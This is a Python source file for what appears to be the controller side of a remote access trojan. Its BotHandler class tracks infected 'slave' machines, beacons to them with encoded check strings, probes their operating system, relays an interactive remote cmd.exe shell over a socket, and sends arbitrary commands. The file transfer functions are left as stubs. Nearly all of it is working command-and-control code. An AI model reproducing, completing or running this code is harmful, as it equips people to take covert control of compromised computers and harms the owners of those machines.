
# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time
import random

class Handler(threading.Thread):

    def __init__(self, client, client_address, bot_id):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.bot_id = bot_id
        self.info = [self.bot_id,self.ip,self.port]
        self.beacon_wait = False
        self.os = ''
        self.status = ["UP","UP"]                           # <--UP - DOWN - ERR 
                                                            # [0] = PING, [1] = BEACON

        # Log by



    def run(self):

        # Returns 'Thread-#': Useful for specific interaction?
        # This specific line returns 'None'
        #self.BotName = threading.current_thread().getName()

        print(f"[*BotHandler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")

        # Grab operating system : Linux/Windows
        self.setOS()

        # Beacon indefinitely??
        self.beacon()


    def kill(self):     # hah
        print(f"\n[*BotHandler-Msg] Severing connection for Bot {str(self.bot_id)}...")
        self.execute("kill")

        print(f"\n[*BotHandler-Msg] Killing thread for BotHandler {str(self.bot_id)}...")
        # if(threading.current_thread().is_alive()):
        #     threading.current_thread().join


    def beacon(self):
        
        while(True):
            time.sleep(random.randint(10,40))

            # Check HOST-STATUS
            try:
                ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
                if ping == 0:
                    self.status[0] = "UP"
                else:
                    self.status[0] = "DOWN"
            except:
                self.status[0] = "ERR"

            # Write to log file - record uptime

            # Check RAT-STATUS
            if not self.beacon_wait:
                try:
                    msg = self.execute("beacon", True)

                    if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
                        self.status[1] = "UP"
                    else:
                        self.status[1] = "DOWN"
                except:
                    self.status[1] = "ERR"
                    
            # Write to beacon log file to record status



    def setStatus(self, index0, index1):
        self.status[0] = index0
        self.status[1] = index1

    def setOS(self):
        self.os = self.execute("UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt")
        
    def getOS(self):
        return self.os

    def getInfo(self):
        return self.info

    def printInfo(self):
        print(self.info)

    def getID(self):
        return self.bot_id

    def getIP(self):
        return self.ip

    def getPort(self):
        return self.port

    def shell(self):

        self.beacon_wait = True


        # Initiate shell

        try:
            self.client.send(("shell").encode('utf-8'))             # Signals RAT to initiate cmd.exe process and forward fds to socket 
        except Exception as ex:
            print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
            return False                            # unsuccessful
        else:
            banner = ""
            while True:
                try:
                    self.client.settimeout(2)
                    recv = self.client.recv(4096).decode('utf-8')
                except:
                    recv = ""
                if not recv:
                    break
                else:
                    banner += recv
            if banner:
                print(banner)
        
        time.sleep(0.5)

        while (True):                                                           # Capture IO sent over socket (cmd.exe)
            try:
                cmd_sent = input()                                            # Dumb capture in
                cmd_sent += "\n"
            except Exception as ex:
                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")  # Error recived? pass
                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
            else:
                try:
                    cmd_response = ""
                    shell_exit = False
                    if(cmd_sent.casefold().strip(" ") == 'quit\n' or cmd_sent.casefold().strip(" ") == 'exit\n'):
                        print(f"[* BotHandler-Msg:ShellExec] Sending EXIT signal to Agent. Please wait...")
                        self.client.send(("exit\n").encode('utf-8'))

                        while(True):

                            self.client.settimeout(0.5)

                            try:
                                recv = self.client.recv(4096).decode('utf-8')

                            except socket.timeout:
                                # if timeout exception is triggered - assume no data anymore
                                recv = ""
                            except Exception as ex:
                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                                break

                            if not recv:
                                break
                            else:
                                cmd_response += recv  
                        
                        # print("yo1")
                        shell_exit = True

                    else:
                        self.client.send((cmd_sent).encode('utf-8'))

                        while(True):
                            try:
                                if (cmd_sent.casefold() == "\n"):
                                    self.client.settimeout(0.5)
                                elif (len(cmd_response) <= len(cmd_sent)):
                                    self.client.settimeout(5)
                                else:
                                    self.client.settimeout(1)
                                    
                                recv = self.client.recv(4096).decode('utf-8')

                            except socket.timeout:
                                # if timeout exception is triggered - assume no data anymore
                                recv = ""
                            except Exception as ex:
                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                                break

                            if not recv:
                                break
                            
                            else:
                                cmd_response += recv
                    
                except Exception as ex:
                    print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")        #Error Received? pass
                    print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                else:
                    
                    if len(cmd_response.strip()) > 1:
                        # Removing sent command from response before printing output
                        print(cmd_response.replace(cmd_sent,""))
            
                    if(shell_exit):
                        break

        print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
        return True


    def execute(self, cmd_sent, suppress=False):
        if not suppress:
            # Log this
            print(f"[* BotHandler-Msg] Received Command: {str(cmd_sent)} for bot {str(self.bot_id)}")

        # Single instance execution
        try:
            # Send data/command to RAT
            
            self.client.send(cmd_sent.encode('utf-8'))
        except Exception as ex:
            # Log this
            print(f"[* BotHandler-Msg] Unable to send command to bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg] Error: {ex}")
            return "== Return Value Error =="
        else:
            cmd_response = ""
            while(True):
                try:
                    self.client.settimeout(3)
                    recv = self.client.recv(4096).decode('utf-8')

                except socket.timeout:
                    # if timeout exception is triggered - assume no more data
                    recv = ""
                except Exception as ex:
                    if not suppress:
                        # Log this
                        print("[* BotHandler-Msg:Exec] Unable to process received data.")
                        print(f"[* BotHandler-Msg:Exec] Error: {ex}")
                    break

                if not recv:
                    break
                else:
                    cmd_response += recv
            
            return cmd_response
    # TODO %%
    def download(self, remotepath, localfile):
        print("TBC")

    def upload(self, localfile, remotepath):
        print("TBC")

    # def log(self, type, msg, ):

    #     if type == ping:
    #         # write to uptime log
    #     elif type == beacon:
    #         # write to beacon log
    #     elif type == error:
    #         # write to error log
    #     elif type == status:
    #         # 